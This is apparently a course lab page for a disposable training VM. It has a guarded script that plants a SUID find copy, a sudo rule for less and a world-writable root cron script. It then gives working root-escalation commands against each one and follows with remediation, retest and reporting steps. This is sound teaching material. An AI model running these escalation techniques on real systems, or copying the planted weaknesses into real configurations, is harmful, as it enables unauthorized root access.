---
title: "LAB-501-03 · Final Challenge: Escalate, Report, Remediate, Retest"
description: "Exploit three deliberate misconfigurations on a disposable training VM, document them, fix the causes, and prove the fixes with the same methods."
module_code: CYB-501
level: 5
kind: lab
prerequisites: [CYB-501]
estimated_minutes: 240
difficulty: advanced
safety: isolated-vm
lab_ids: [LAB-501-03]
version: 1.0.0
last_reviewed: 2026-10-29
reviewers: []
status: published
tags: [privilege-escalation, suid, sudo, cron, remediation, retest, final-challenge]
---

# LAB-501-03 · Final Challenge: Escalate, Report, Remediate, Retest

## Scenario and background

A dedicated training VM has been configured with three realistic local privilege-escalation weaknesses. You have a
low-privilege shell as `lab501`. Your task is the full cycle: enumerate, escalate by the least invasive path, document
with evidence, fix the **causes**, and prove the fixes by repeating the original methods.

This is the module's final practical challenge. The rubric weights the retest evidence highest, because a fix nobody
verified is a claim.

## Learning objectives

1. Enumerate local privilege-escalation surfaces systematically.
2. Escalate using a documented technique on a training VM, capturing proof rather than a screenshot of a prompt.
3. Distinguish the symptom from the cause when remediating.
4. Retest with the same method and the same account.
5. Report findings with ratings, evidence and verification.

## Required tools and versions

| Tool | Version | Notes |
| --- | --- | --- |
| Ubuntu Server | 24.04 | **Disposable clone**, hostname `lab-privesc` |
| Standard utilities | — | `find`, `sudo`, `id`, `ls`, `systemctl`, `crontab` |
| `visudo` | sudo package | Validate sudoers changes |

!!! warning "Authorized scope — read before you begin"
    **This VM is deliberately insecure and must never be reused.** Clone it from your base image, keep it on the
    host-only network, and revert the snapshot when finished.

    **The setup script refuses to run unless you create `/etc/lab501-training-vm` first.** That marker is your
    confirmation that the host is disposable. Do not remove the guard, and do not run the script on a host that
    matters — it creates a SUID binary, a sudo rule and a root cron job.

    **Stop at root proof.** Do not install persistence, do not modify system binaries, and do not test other hosts.

    Full rules: [Safety Policy](../../../policies/safety-policy.md).

## Threat model

An attacker with a low-privilege local account looks for ways to execute code as root: misconfigured SUID binaries,
over-broad sudo rules, world-writable scripts executed by privileged schedulers, and writable service definitions.
All three weaknesses in this lab are common in real environments for the same reason: convenience outlived review.

## Procedure

### 1. Prepare the disposable VM

```bash
sudo hostnamectl set-hostname lab-privesc
sudo touch /etc/lab501-training-vm
sudo useradd -m -s /bin/bash lab501
echo 'lab501:Lab501Training!' | sudo chpasswd
sudo mkdir -p /opt/lab501 /var/log
sudo touch /var/log/lab501.log
```

Take a snapshot named `lab501-vulnerable`. Everything after this point is recoverable in one click.

### 2. Apply the three weaknesses

`setup-lab501.sh` — run as root, on the disposable VM only:

```bash
#!/bin/bash
set -euo pipefail

if [ ! -f /etc/lab501-training-vm ]; then
    echo "Refusing: /etc/lab501-training-vm is missing. This script is for the disposable training VM only." >&2
    exit 1
fi
if [ "$(hostname)" != "lab-privesc" ]; then
    echo "Refusing: hostname is not lab-privesc." >&2
    exit 1
fi

# 1. SUID copy of find (a training weakness, not a system change to /usr/bin/find)
cp /usr/bin/find /usr/local/bin/find-backup
chmod 4755 /usr/local/bin/find-backup

# 2. Over-broad sudo rule: less on a log file
cat > /etc/sudoers.d/lab501 <<'EOF'
lab501 ALL=(root) NOPASSWD: /usr/bin/less /var/log/lab501.log
EOF
chmod 440 /etc/sudoers.d/lab501
visudo -c

# 3. Root cron job running a world-writable script
cat > /opt/lab501/heartbeat.sh <<'EOF'
#!/bin/sh
/usr/bin/logger "lab501 heartbeat"
EOF
chmod 777 /opt/lab501/heartbeat.sh
cat > /etc/cron.d/lab501 <<'EOF'
* * * * * root /opt/lab501/heartbeat.sh
EOF
chmod 644 /etc/cron.d/lab501

echo "Training weaknesses applied. Snapshot now if you have not already."
```

```bash
sudo bash setup-lab501.sh
sudo -u lab501 -H bash -lc 'id; sudo -l'
```

**Expected:** `uid=1001(lab501)`, and one sudo entry permitting `/usr/bin/less /var/log/lab501.log`.

### 3. Enumerate as the low-privilege user

```bash
sudo -u lab501 -H bash -lc '
  id
  sudo -l
  find / -perm -4000 -type f 2>/dev/null | sort
  ls -la /opt/lab501
  cat /etc/cron.d/lab501 2>/dev/null
  systemctl list-timers --all 2>/dev/null | head
' | tee ~/lab501/enumeration.txt
```

**Expected:** three signals — `find-backup` in the SUID list, a sudo rule for `less`, and a world-writable script
referenced by a root cron entry.

**Log the three hypotheses before exploiting any of them.** A finding without a stated hypothesis is luck.

### 4. Escalate — choose one path, document it

**Path A: sudo `less`**

```bash
sudo -u lab501 -H bash -lc 'sudo /usr/bin/less /var/log/lab501.log'
# inside less:
!sh
id
```

**Expected:** `uid=0(root)` from the shell spawned by `less`. Exit with `exit`, then `q`.

**Path B: SUID `find`**

```bash
sudo -u lab501 -H bash -lc '/usr/local/bin/find-backup . -maxdepth 0 -exec /bin/sh -p \; -quit'
id
```

**Expected:** `euid=0(root)` because `-p` preserves the elevated effective UID.

**Path C: writable cron script**

```bash
sudo -u lab501 -H bash -lc 'cat > /opt/lab501/heartbeat.sh <<"EOF"
#!/bin/sh
cp /bin/bash /tmp/lab501-rootbash
chmod 4755 /tmp/lab501-rootbash
EOF'
sleep 70
sudo -u lab501 -H bash -lc '/tmp/lab501-rootbash -p -c "id"'
```

**Expected:** `euid=0(root)` within about a minute.

**Document exactly one path in the report as the demonstrated exploit**, and mention the others as additional
findings you validated by inspection. Exploiting all three is unnecessary.

### 5. Capture proof, then stop

```bash
# In the root shell from your chosen path
id | tee /root/lab501-proof.txt
date -u >> /root/lab501-proof.txt
hostname >> /root/lab501-proof.txt
sha256sum /root/lab501-proof.txt
```

Copy the proof into your evidence directory **as the low-privilege user is unable to read `/root`** — use the root
shell to `cp` it to `/tmp` with a hash, then read it:

```bash
cp /root/lab501-proof.txt /tmp/lab501-proof.txt
chmod 644 /tmp/lab501-proof.txt
sha256sum /root/lab501-proof.txt /tmp/lab501-proof.txt
```

**Expected:** matching hashes, `uid=0(root)`, a UTC timestamp and the hostname.

**Stop condition:** you have proved root. Do not create users, do not add SSH keys, do not modify `/etc/passwd`.

### 6. Clean up the exploit artefacts

```bash
sudo rm -f /tmp/lab501-rootbash
```

Record the cleanup time. Leaving a SUID root shell behind is how a training exercise becomes an incident.

### 7. Remediate the causes

```bash
# A. Remove the SUID bit and the copy
sudo chmod u-s /usr/local/bin/find-backup
sudo rm -f /usr/local/bin/find-backup

# B. Remove the over-broad sudo rule and validate sudoers
sudo rm -f /etc/sudoers.d/lab501
sudo visudo -c

# C. Fix ownership and permissions; remove the cron job
sudo chown root:root /opt/lab501/heartbeat.sh
sudo chmod 755 /opt/lab501/heartbeat.sh
sudo rm -f /etc/cron.d/lab501
sudo systemctl restart cron

# D. Verify nothing else was left behind
sudo find / -perm -4000 -type f 2>/dev/null | sort | tee ~/lab501/suid-after.txt
sudo find / -user lab501 -type f 2>/dev/null | head
```

**Expected:** `find-backup` is gone from the SUID list; `visudo -c` passes; the cron file is absent; no unexpected
SUID binaries.

**Remediation is not deletion alone.** For each fix, state the control that prevents recurrence: package-managed
binaries only, sudo rules scoped to commands with no shell escape, cron scripts owned by root and not writable by
others, and a periodic SUID inventory.

### 8. Retest with the same methods

```bash
sudo -u lab501 -H bash -lc '
  echo "--- A: sudo less ---"; sudo -n /usr/bin/less /var/log/lab501.log </dev/null; echo "exit=$?"
  echo "--- B: SUID find ---"; ls -l /usr/local/bin/find-backup 2>&1
  echo "--- C: cron script ---"; ls -l /opt/lab501/heartbeat.sh; ls -l /etc/cron.d/lab501 2>&1
'
```

**Expected:** A fails (`sudo: a password is required` or "not allowed"); B reports no such file; C shows root-owned
`755` and no cron entry.

Then confirm the **legitimate** function still works: the heartbeat logger still runs if you kept a root-owned version,
and the application that needed `less` on the log has another approved path. A fix that breaks the business function
will be reverted by someone at 2 a.m.

### 9. Report and retest table

`report.md`:

| Finding | CVSS / context | Evidence | Cause | Fix | Retest result |
| --- | --- | --- | --- | --- | --- |
| SUID `find` copy | | | | | |
| Sudo `less` rule | | | | | |
| World-writable root cron script | | | | | |

Include: executive summary (three sentences), scope and method, coverage limits (no kernel exploits tested, no
service-level weaknesses examined), and a statement that the VM was training-only.

## Evidence to collect

- `enumeration.txt` with the three hypotheses.
- The exploit transcript for your chosen path, with timestamps.
- `/root/lab501-proof.txt` and its hash, plus the `/tmp` copy hash.
- `cleanup.md`.
- `suid-after.txt`, `visudo -c` output, retest transcript.
- `report.md` with the retest table.

## Verification

- [ ] Setup script guard was respected; VM was a disposable clone on the host-only network.
- [ ] Enumeration produced three hypotheses before exploitation.
- [ ] Exactly one path was exploited to root, with proof and a hash.
- [ ] Proof shows `uid=0` or `euid=0`, UTC time and hostname.
- [ ] Cleanup removed the SUID shell and recorded the time.
- [ ] All three causes remediated, not just the symptoms.
- [ ] Retest used the same account and method, and shows failure.
- [ ] Legitimate function still works after remediation.
- [ ] Report states coverage limits and that the VM was training-only.

## Teardown and reset

Revert `lab501-vulnerable`. If you want to keep the remediated VM for comparison, snapshot it as
`lab501-remediated` first, then revert. Delete the clone when the module is finished.

## Reflection

1. You documented one exploit and validated the others by inspection. Why is that the professional choice?
2. For each weakness, name the process failure that allowed it to exist, not just the technical fix.
3. Your retest shows the sudo rule is gone. How do you prove the *business* need was met another way?
4. If the client's environment has 400 servers, how would you find these three weaknesses at scale, and what would
   you do about the false positives?

## Rubric

| Criterion | 1 — Incomplete | 3 — Competent | 5 — Proficient |
| --- | --- | --- | --- |
| Enumeration | One vector tried | Three identified | Hypotheses stated before exploitation, with evidence |
| Escalation | Root without proof | Proof captured | Proof hashed, path documented, artefacts cleaned |
| Remediation | SUID bit removed only | All three fixed | Causes fixed plus recurrence controls named |
| Retest | Not performed | Methods repeated | Same account and method, failure shown, function preserved |
| Report | Narrative | Findings and fixes | Coverage limits, ratings and a retest table |

## Troubleshooting

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| Setup script refuses | Marker missing or hostname wrong | Create `/etc/lab501-training-vm`, set hostname `lab-privesc` |
| `sudo -l` shows nothing | sudoers file mode wrong, or syntax error | `chmod 440`, `visudo -c`, check the path exactly |
| SUID `find` does not elevate | `-p` omitted, or shell drops privileges | Use `-exec /bin/sh -p \;` and check `id`, not `whoami` |
| Cron path never fires | Cron service stopped, or file mode ignored | `systemctl status cron`; `/etc/cron.d` files need mode 644 |
| Retest still succeeds | Remediation applied to the wrong path | Compare `ls -l` and `sudo -l` output with the report |
| Cannot read `/root` proof | Expected: low-privilege user | Copy to `/tmp` from the root shell, then hash both |

## References

1. GTFOBins — `find`, `less` and SUID/sudo escape techniques. <https://gtfobins.github.io/> Accessed 2026-10-29.
2. NIST SP 800-115 — assessment and remediation verification. Accessed 2026-10-29.
3. CIS Benchmarks — Linux privilege and scheduling controls. Accessed 2026-10-29.
4. MITRE ATT&CK — T1548.001 Setuid and Setgid; T1548.003 Sudo and Sudo Caching; T1053.003 Cron. Accessed 2026-10-29.
